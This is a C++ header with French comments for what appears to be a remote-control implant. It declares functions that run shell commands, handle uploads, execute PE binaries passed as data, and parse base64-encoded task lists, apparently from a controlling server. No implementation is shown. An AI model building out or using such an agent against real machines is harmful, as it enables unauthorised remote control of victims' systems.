#pragma once
#include <string>
#include <vector>

// Gestion du répertoire de travail
void init_current_directory();
void set_current_directory(const std::string& path);
std::string get_current_directory_path();

// Fonctions principales
std::string exec_cmd(const std::string& cmd);
std::string handle_upload(std::string data);
std::string handle_pe_exec(std::string pe_data);
// ========== AJOUT: Déclaration de execute_command ==========
std::string execute_command(const std::string& command);

// Nouvelle API recommandée
std::string parse_and_execute_tasks(const std::string& b64_encoded_response);

// Legacy (compatibilité)
std::string parse_task(std::string b64_encoded_task);

// Fonctions utilitaires
std::string extract_json_value(const std::string& json, const std::string& key);
std::vector<std::string> extract_commands_array(const std::string& json);
std::string execute_single_command(const std::string& command);
void parse_type_and_value(const std::string& task, std::string& type, std::string& value);
